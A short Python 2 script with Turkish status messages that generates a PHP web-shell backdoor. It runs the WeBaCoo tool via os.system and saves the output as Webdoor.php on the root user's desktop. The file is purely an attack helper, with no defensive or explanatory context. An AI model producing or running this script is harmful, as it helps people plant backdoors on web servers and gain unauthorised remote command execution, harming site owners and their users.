#!/usr/bin/python/
# -*- coding: utf-8 -*-

import sys
import os
import time
from time import sleep
import traceback

print """
--------------------------
BACK DOOR OLUŞTURULUYOR..
--------------------------
"""
time.sleep(1.5)

cmd1 = os.system ('webacoo -g -o /root/Desktop/Webdoor.php')

print "BACKDOOR OLUŞTURULDU.."
